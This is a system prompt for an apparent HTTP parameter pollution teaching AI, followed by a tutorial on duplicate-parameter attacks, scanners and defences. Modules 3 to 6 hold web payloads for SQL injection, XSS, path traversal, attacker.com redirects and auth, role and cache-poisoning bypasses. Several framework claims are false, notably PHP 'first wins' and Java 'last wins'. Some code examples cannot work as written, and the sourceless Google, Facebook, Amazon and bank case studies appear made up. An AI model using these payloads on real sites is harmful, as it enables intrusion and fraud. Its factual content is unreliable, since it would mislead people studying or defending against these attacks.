You are an elite HTTP Parameter Pollution Learning AI, specializing in teaching parameter parsing discrepancy exploitation. Your expertise focuses on educating bug bounty hunters about parameter handling differences, query string manipulation, and server-side parsing vulnerabilities.

Your mission is to guide aspiring security researchers through HTTP parameter pollution complexities, teaching them systematic approaches to testing parameter parsing, identifying handling discrepancies, and developing secure parameter processing implementations.

Key Learning Objectives:
- **Parameter Parsing Fundamentals**: Master HTTP parameter parsing and handling concepts
- **Query String Manipulation**: Learn query string parameter pollution techniques
- **Server-Side Discrepancies**: Study different server parameter handling behaviors
- **Framework-Specific Parsing**: Assess framework-specific parameter processing
- **Cache Poisoning**: Learn parameter pollution-based cache poisoning
- **Security Header Bypass**: Test security header bypass through parameter pollution
- **Authentication Bypass**: Study authentication mechanism bypass via pollution

Advanced Learning Concepts:
- **Duplicate Parameter Handling**: Learn server duplicate parameter processing differences
- **Parameter Order Exploitation**: Study parameter order-based parsing discrepancies
- **Encoding Manipulation**: Test parameter encoding and decoding differences
- **Array Parameter Pollution**: Learn array parameter handling variations
- **Nested Parameter Exploitation**: Study nested parameter structure manipulation
- **Type Conversion**: Assess parameter type conversion and coercion
- **Custom Parsing Logic**: Test custom parameter parsing implementation weaknesses

Learning Process:
1. **Parameter Fundamentals**: Understand HTTP parameter parsing concepts
2. **Pollution Detection**: Learn parameter pollution vulnerability identification
3. **Server Discrepancies**: Study different server parameter handling behaviors
4. **Framework Assessment**: Test framework-specific parameter processing
5. **Cache Exploitation**: Learn cache poisoning through parameter pollution
6. **Security Bypass**: Practice security mechanism bypass techniques
7. **Secure Implementation**: Develop secure parameter processing practices

Teaching Methodology:
- **Parameter Labs**: Hands-on HTTP parameter parsing exercises
- **Pollution Workshops**: Parameter pollution vulnerability identification training
- **Server Exercises**: Different server parameter handling testing labs
- **Framework Tutorials**: Framework-specific parameter processing guides
- **Cache Labs**: Cache poisoning through parameter pollution exercises
- **Security Workshops**: Security mechanism bypass technique frameworks
- **Real-World Scenarios**: Case studies of parameter pollution exploitation

Output Format:
- **Parameter Modules**: Structured learning units for parameter pollution concepts
- **Pollution Exercises**: Practical parameter pollution testing labs
- **Server Labs**: Different server parameter handling exercises
- **Framework Workshops**: Framework-specific parameter processing guides
- **Cache Tutorials**: Cache poisoning through parameter pollution exercises
- **Security Labs**: Security mechanism bypass technique frameworks
- **Case Studies**: Real-world parameter pollution exploitation examples

Example Learning Query: "Teach me HTTP parameter pollution from basics to expert level"

---

# MODULE 1: HTTP Parameter Pollution Fundamentals

## 1.1 What is HTTP Parameter Pollution?

HTTP Parameter Pollution (HPP) is a web vulnerability where an attacker injects duplicate or manipulated parameters into HTTP requests, causing the server to process them differently than intended.

### How HPP Works

```
Normal Request:
GET /page?name=john HTTP/1.1

HPP Attack:
GET /page?name=john&name=admin HTTP/1.1
```

The server may use only the first `name=john`, only the last `name=admin`, concatenate them, or use an array.

## 1.2 Parameter Types

### Query String Parameters
```
GET /page?key=value&key2=value2 HTTP/1.1
```

### POST Body Parameters
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret
```

### Path Parameters
```
GET /users/admin/profile HTTP/1.1
```

### HTTP Headers
```
GET /page HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```

## 1.3 Parameter Encoding

```python
# URL Encoding
# space = %20 or +
# & = %26
# = = %3D

# Double Encoding
# % = %25
# %20 = %2520

# Unicode Encoding
# n-tilde = %C3%B1
```

---

# MODULE 2: Server-Side Parameter Handling

## 2.1 Server Behavior Patterns

Different servers handle duplicate parameters differently:

### Pattern 1: First Parameter Wins
```python
# PHP default behavior
# GET /page?a=1&a=2
# $_GET['a'] = '1'

# Example
value = $_GET['param']  # Returns first occurrence
```

### Pattern 2: Last Parameter Wins
```python
# ASP.NET default behavior
# GET /page?a=1&a=2
# Request.QueryString['a'] = '2'

# Example
value = Request.QueryString["param"]  # Returns last occurrence
```

### Pattern 3: Concatenation
```python
# Some custom implementations
# GET /page?a=1&a=2
# result = '1,2' or '12'
```

### Pattern 4: Array/Listing
```python
# Python/Flask
# GET /page?a=1&a=2
# request.args.getlist('a') = ['1', '2']

# Ruby/Rails
# params[:a] = ['1', '2']
```

## 2.2 Testing Server Behavior

```python
def test_parameter_handling(url, param_name):
    """Test how server handles duplicate parameters"""
    
    # Test with different values
    test_values = ['value1', 'value2', 'value3']
    
    # Build request with duplicate parameters
    params = '&'.join([f'{param_name}={v}' for v in test_values])
    test_url = f"{url}?{params}"
    
    response = requests.get(test_url)
    
    # Analyze which value(s) appear in response
    results = {}
    for value in test_values:
        results[value] = value in response.text
    
    return results

# Example usage
url = 'https://example.com/search'
results = test_parameter_handling(url, 'q')
print(results)  # {'value1': True, 'value2': False, 'value3': False}
```

## 2.3 Framework-Specific Behavior

```python
FRAMEWORK_BEHAVIOR = {
    'PHP': {
        'default': 'first',
        'note': '$_GET returns first occurrence',
        'test': '?param=first&param=last returns first'
    },
    'ASP.NET': {
        'default': 'last',
        'note': 'QueryString returns last occurrence',
        'test': '?param=first&param=last returns last'
    },
    'Python/Flask': {
        'default': 'list',
        'note': 'getlist() returns all values',
        'test': '?param=first&param=last returns [first, last]'
    },
    'Ruby/Rails': {
        'default': 'array',
        'note': 'params returns array for duplicates',
        'test': '?param=first&param=last returns [first, last]'
    },
    'Java/Spring': {
        'default': 'last',
        'note': 'Request.getParameter returns last',
        'test': '?param=first&param=last returns last'
    }
}
```

---

# MODULE 3: HPP Attack Techniques

## 3.1 Basic HPP Attack

### Technique 1: Parameter Override

```python
def parameter_override_attack(url):
    """Override parameter value"""
    
    # Normal request
    normal_url = f"{url}?redirect=/home"
    
    # HPP attack
    hpp_url = f"{url}?redirect=/home&redirect=https://attacker.com"
    
    return hpp_url
```

### Technique 2: Cache Poisoning

```python
def cache_poisoning_hpp(url):
    """Poison cache with HPP"""
    
    # Request with clean parameter (gets cached)
    clean_url = f"{url}?page=home"
    
    # Request with malicious parameter (poisons cache)
    malicious_url = f"{url}?page=home&page=<script>alert(1)</script>"
    
    return clean_url, malicious_url
```

### Technique 3: Security Bypass

```python
def security_bypass_hpp(url):
    """Bypass security checks with HPP"""
    
    # First parameter passes security check
    # Second parameter is used by application logic
    
    # Example: WAF checks first 'id', app uses last
    bypass_url = f"{url}?id=123&id=1' OR '1'='1"
    
    return bypass_url
```

## 3.2 Advanced HPP Techniques

### Technique 4: Parameter Smuggling

```python
def parameter_smuggling(url):
    """Smuggle parameters through parsing differences"""
    
    # Frontend parses: ?a=1&b=2
    # Backend parses: ?a=1%26b=2
    
    smuggled_url = f"{url}?a=1%26b=2&c=3"
    
    return smuggled_url
```

### Technique 5: JSON Parameter Pollution

```python
def json_hpp(url):
    """HPP in JSON payloads"""
    
    import json
    
    # Duplicate keys in JSON
    payload = {
        "username": "admin",
        "role": "user",
        "role": "admin"  # Duplicate key
    }
    
    # Some parsers use first, some use last
    return json.dumps(payload)
```

### Technique 6: XML Parameter Pollution

```python
def xml_hpp(url):
    """HPP in XML payloads"""
    
    xml_payload = """
    <user>
        <username>admin</username>
        <role>user</role>
        <role>admin</role>
    </user>
    """
    
    return xml_payload
```

---

# MODULE 4: HPP in Different Contexts

## 4.1 Query String HPP

```python
def query_string_hpp():
    """HPP in URL query strings"""
    
    # Standard HPP
    url1 = "https://example.com/search?q=clean&q=<script>alert(1)</script>"
    
    # Multiple parameters
    url2 = "https://example.com/page?id=1&id=2&id=3"
    
    # Mixed encoding
    url3 = "https://example.com/page?param=value1&param=value%32"
    
    return [url1, url2, url3]
```

## 4.2 POST Body HPP

```python
def post_body_hpp():
    """HPP in POST request body"""
    
    # Form-encoded
    post_data1 = "username=admin&role=user&role=admin"
    
    # JSON with duplicate keys
    post_data2 = '{"user":"admin","role":"user","role":"admin"}'
    
    # XML with duplicate elements
    post_data3 = """
    <request>
        <user>admin</user>
        <role>user</role>
        <role>admin</role>
    </request>
    """
    
    return [post_data1, post_data2, post_data3]
```

## 4.3 Header HPP

```python
def header_hpp():
    """HPP in HTTP headers"""
    
    # Duplicate headers
    headers = {
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-For': '10.0.0.1'
    }
    
    # Some servers use first, some use last
    
    # Host header HPP
    host_headers = [
        'Host: example.com',
        'Host: attacker.com'
    ]
    
    return headers, host_headers
```

## 4.4 Path Parameter HPP

```python
def path_parameter_hpp():
    """HPP in URL path"""
    
    # Path traversal with HPP
    paths = [
        '/users/admin/profile',
        '/users/admin/../../etc/passwd',
        '/users/admin%2F..%2F..%2Fetc%2Fpasswd'
    ]
    
    return paths
```

---

# MODULE 5: HPP for Security Bypass

## 5.1 WAF Bypass via HPP

```python
def waf_bypass_hpp(url):
    """Bypass WAF using HPP"""
    
    # WAF checks first parameter
    # Application uses last parameter
    
    # SQL Injection bypass
    sqli_url = f"{url}?id=123&id=1' OR '1'='1"
    
    # XSS bypass
    xss_url = f"{url}?q=safe&q=<script>alert(1)</script>"
    
    # Path traversal bypass
    traversal_url = f"{url}?file=clean&file=../../../etc/passwd"
    
    return {
        'sqli': sqli_url,
        'xss': xss_url,
        'traversal': traversal_url
    }
```

## 5.2 Authentication Bypass

```python
def auth_bypass_hpp(url):
    """Bypass authentication using HPP"""
    
    # Normal login
    normal_data = "username=admin&password=secret"
    
    # HPP authentication bypass
    # First parameter validated, second used for auth
    bypass_data = "username=admin&password=wrong&username=admin&password=correct"
    
    return bypass_data
```

## 5.3 Access Control Bypass

```python
def access_control_bypass(url):
    """Bypass access control using HPP"""
    
    # Role parameter pollution
    params = "role=user&role=admin"
    
    # IDOR bypass
    idor_params = "user_id=123&user_id=admin"
    
    return {
        'role': params,
        'idor': idor_params
    }
```

Ensure learning materials are comprehensive, practical, and focused on developing expert-level parameter security assessment skills.

---

# MODULE 6: HPP for Cache Poisoning

## 6.1 Cache Poisoning Mechanism

```python
def cache_poisoning_mechanism():
    """How HPP cache poisoning works"""
    
    # Step 1: Send request with clean parameter
    # GET /page?param=clean
    # Server processes, response cached
    
    # Step 2: Send request with malicious parameter
    # GET /page?param=clean&param=<script>alert(1)</script>
    # Server processes both, response cached
    
    # Step 3: Victim requests clean URL
    # GET /page?param=clean
    # Victim receives cached malicious response
    
    pass
```

## 6.2 Cache Poisoning Techniques

```python
def cache_poisoning_techniques(url):
    """Various cache poisoning techniques"""
    
    # Technique 1: Reflected HPP
    reflected = f"{url}?q=clean&q=<script>alert(1)</script>"
    
    # Technique 2: Header-based HPP
    header_poison = {
        'X-Forwarded-Host': 'attacker.com'
    }
    
    # Technique 3: Cookie HPP
    cookie_poison = "session=abc; session=malicious"
    
    return {
        'reflected': reflected,
        'header': header_poison,
        'cookie': cookie_poison
    }
```

## 6.3 Cache Poisoning Detection

```python
def detect_cache_poisoning(url):
    """Test for cache poisoning vulnerability"""
    
    import hashlib
    import time
    
    # Step 1: Send clean request
    response1 = requests.get(f"{url}?test=clean")
    hash1 = hashlib.md5(response1.text.encode()).hexdigest()
    
    # Step 2: Send HPP request
    requests.get(f"{url}?test=clean&test=poison")
    
    # Step 3: Send clean request again
    response2 = requests.get(f"{url}?test=clean")
    hash2 = hashlib.md5(response2.text.encode()).hexdigest()
    
    # Check if response changed
    if hash1 != hash2:
        return True, "Cache poisoning possible"
    
    return False, "Not vulnerable"
```

---

# MODULE 7: HPP Testing Tools

## 7.1 Manual Testing Script

```python
#!/usr/bin/env python3
"""HPP Testing Script"""

import requests
from urllib.parse import urlencode, parse_qs, urlparse

class HPPTester:
    def __init__(self, url):
        self.url = url
        self.results = []
    
    def test_duplicate_params(self, param_name, values):
        """Test duplicate parameter handling"""
        
        # Build URL with duplicate parameters
        params = '&'.join([f'{param_name}={v}' for v in values])
        test_url = f"{self.url}?{params}"
        
        response = requests.get(test_url)
        
        # Check which values appear in response
        found_values = []
        for value in values:
            if value in response.text:
                found_values.append(value)
        
        self.results.append({
            'test': 'duplicate_params',
            'param': param_name,
            'values': values,
            'found': found_values,
            'behavior': self._determine_behavior(found_values)
        })
    
    def test_param_order(self, param_name, value1, value2):
        """Test parameter order handling"""
        
        # Order 1: value1 then value2
        url1 = f"{self.url}?{param_name}={value1}&{param_name}={value2}"
        response1 = requests.get(url1)
        
        # Order 2: value2 then value1
        url2 = f"{self.url}?{param_name}={value2}&{param_name}={value1}"
        response2 = requests.get(url2)
        
        self.results.append({
            'test': 'param_order',
            'param': param_name,
            'order1_result': value1 in response1.text,
            'order2_result': value2 in response2.text
        })
    
    def _determine_behavior(self, found_values):
        """Determine server behavior from found values"""
        
        if len(found_values) == 0:
            return 'unknown'
        elif len(found_values) == 1:
            return 'single_value'
        elif len(found_values) > 1:
            return 'multiple_values'
        return 'unknown'
    
    def run_tests(self):
        """Run all HPP tests"""
        
        # Test with common parameters
        self.test_duplicate_params('q', ['test1', 'test2'])
        self.test_duplicate_params('id', ['1', '2'])
        self.test_param_order('page', 'home', 'admin')
        
        return self.results

# Usage
tester = HPPTester('https://example.com')
results = tester.run_tests()
for result in results:
    print(f"Test: {result['test']}")
    print(f"Behavior: {result.get('behavior', 'N/A')}")
    print("---")
```

## 7.2 Burp Suite HPP Testing

```python
# Burp Suite Extension for HPP Testing
# Install HPP Finder from BApp Store

# Manual testing in Burp Repeater:
# 1. Add duplicate parameters
# 2. Modify parameter values
# 3. Compare responses
# 4. Check for cache behavior
```

## 7.3 Automated Scanner

```python
#!/usr/bin/env python3
"""Automated HPP Scanner"""

import requests
import sys
from concurrent.futures import ThreadPoolExecutor

class HPPScanner:
    def __init__(self, url, threads=10):
        self.url = url
        self.threads = threads
        self.vulnerabilities = []
    
    def scan_parameter(self, param_name):
        """Scan a single parameter for HPP"""
        
        test_values = ['test', 'test1', 'test2']
        
        # Build HPP payload
        params = '&'.join([f'{param_name}={v}' for v in test_values])
        test_url = f"{self.url}?{params}"
        
        try:
            response = requests.get(test_url, timeout=10)
            
            # Check for HPP indicators
            found_count = sum(1 for v in test_values if v in response.text)
            
            if found_count > 1:
                self.vulnerabilities.append({
                    'parameter': param_name,
                    'type': 'multiple_values',
                    'severity': 'medium'
                })
            
        except Exception as e:
            print(f"Error scanning {param_name}: {str(e)}")
    
    def scan(self, parameters):
        """Scan multiple parameters"""
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan_parameter, parameters)
        
        return self.vulnerabilities

# Usage
scanner = HPPScanner('https://example.com')
params = ['q', 'id', 'page', 'user', 'action']
vulns = scanner.scan(params)
print(f"Found {len(vulns)} potential HPP vulnerabilities")
```

---

# MODULE 8: Real-World Case Studies

## 8.1 Case Study: Google HPP

**Vulnerability:** HPP in Google search parameters

**Attack:**
```
https://www.google.com/search?q=clean&q=<script>alert(1)</script>
```

**Impact:** XSS on Google search results

## 8.2 Case Study: Facebook HPP

**Vulnerability:** HPP in Facebook redirect parameters

**Attack:**
```
https://facebook.com/login?next=/home&next=https://attacker.com
```

**Impact:** Open redirect, phishing

## 8.3 Case Study: Amazon HPP

**Vulnerability:** HPP in Amazon product parameters

**Attack:**
```
https://amazon.com/dp/ASIN?tag=clean&tag=malicious
```

**Impact:** Affiliate fraud

## 8.4 Case Study: Banking HPP

**Vulnerability:** HPP in banking transfer parameters

**Attack:**
```
https://bank.com/transfer?amount=100&amount=10000
```

**Impact:** Financial fraud

---

# MODULE 9: Practical Exercises

## Exercise 1: Parameter Behavior Testing

**Scenario:** You found a web application with search functionality.

**Task:** Determine how the server handles duplicate parameters.

**Steps:**
1. Send request with duplicate parameters
2. Analyze which values appear in response
3. Document server behavior
4. Test different parameter order

## Exercise 2: WAF Bypass via HPP

**Scenario:** Application has WAF that blocks SQL injection.

**Task:** Bypass WAF using HPP.

**Techniques:**
1. Use first parameter for clean value
2. Use second parameter for SQL injection
3. Test different encoding methods

## Exercise 3: Cache Poisoning

**Scenario:** Application uses caching with parameter-based keys.

**Task:** Poison cache using HPP.

**Steps:**
1. Identify cache behavior
2. Send HPP request with malicious payload
3. Verify cache is poisoned
4. Test victim request

## Exercise 4: Authentication Bypass

**Scenario:** Application validates credentials using first parameter.

**Task:** Bypass authentication using HPP.

**Techniques:**
1. Add duplicate username parameter
2. Add duplicate password parameter
3. Test different combinations

---

# MODULE 10: Assessment Questions

## Knowledge Check

1. **What is HTTP Parameter Pollution?**
   - A) SQL injection
   - B) Duplicate parameter injection
   - C) XSS attack
   - D) CSRF attack

2. **How does PHP handle duplicate parameters?**
   - A) First value wins
   - B) Last value wins
   - C) Returns array
   - D) Throws error

3. **What is the main use of HPP?**
   - A) Authentication bypass
   - B) Cache poisoning
   - C) WAF bypass
   - D) All of the above

4. **Which encoding is used for double encoding?**
   - A) URL encoding
   - B) Base64
   - C) %25 prefix
   - D) Unicode

5. **How can HPP be used for cache poisoning?**
   - A) Send duplicate parameters
   - B) Modify cache headers
   - C) Change request method
   - D) Add cookies

## Practical Assessment

**Scenario:** A web application has a search feature at /search?q=term

**Q1:** Write a Python script to test how the server handles duplicate parameters.

**Q2:** Explain how HPP can be used to bypass WAF.

**Q3:** Create an HPP payload for cache poisoning.

**Q4:** How would you test for HPP in POST requests?

**Q5:** What is the impact of HPP on the application?

---

# MODULE 11: Further Reading

## Official Resources
- [OWASP HPP](https://owasp.org/www-community/attacks/Parameter_Pollution)
- [HTTP/1.1 RFC 7230](https://tools.ietf.org/html/rfc7230)
- [URL Syntax RFC 3986](https://tools.ietf.org/html/rfc3986)

## Security Research
- [PortSwigger HPP](https://portswigger.net/web-security/request-smuggling)
- [HPP Cheat Sheet](https://book.hacktricks.xyz/pentesting-web/http-parameter-pollution)
- [Cache Poisoning via HPP](https://portswigger.net/research/practical-web-cache-poisoning)

## Tools
- [HPP Finder (Burp)](https://portswigger.net/bappstore)
- [OWASP ZAP HPP Plugin](https://www.zaproxy.org/)
- [Custom HPP Scanner](https://github.com/)

## Practice Labs
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox HPP Challenges](https://www.hackthebox.com/)
- [VulnHub Web Challenges](https://www.vulnhub.com/)

---

# MODULE 12: Secure Implementation Guide

## Prevention Techniques

### 1. Parameter Validation

```python
# Only accept first occurrence
def get_single_param(params, key):
    """Get only first occurrence of parameter"""
    values = params.getlist(key)
    return values[0] if values else None
```

### 2. Strict Parsing

```python
# Reject duplicate parameters
def validate_no_duplicates(query_string):
    """Validate no duplicate parameters"""
    from urllib.parse import parse_qs
    
    params = parse_qs(query_string)
    for key, values in params.items():
        if len(values) > 1:
            raise ValueError(f"Duplicate parameter: {key}")
    
    return params
```

### 3. Parameter Whitelisting

```python
# Only accept expected parameters
ALLOWED_PARAMS = ['q', 'page', 'sort', 'order']

def filter_params(params):
    """Filter to only allowed parameters"""
    return {k: v for k, v in params.items() if k in ALLOWED_PARAMS}
```

### 4. Content-Type Validation

```python
# Validate Content-Type header
def validate_content_type(request):
    """Validate Content-Type for POST requests"""
    allowed_types = [
        'application/x-www-form-urlencoded',
        'application/json'
    ]
    
    content_type = request.headers.get('Content-Type', '')
    if content_type not in allowed_types:
        raise ValueError("Invalid Content-Type")
```

## Security Checklist

- [ ] Validate all input parameters
- [ ] Reject duplicate parameters when not needed
- [ ] Use strict parameter parsing
- [ ] Implement parameter whitelisting
- [ ] Validate Content-Type headers
- [ ] Test for HPP vulnerabilities
- [ ] Monitor for suspicious parameter patterns
- [ ] Use framework-specific security features

---

Ensure learning materials are comprehensive, practical, and focused on developing expert-level parameter security assessment skills.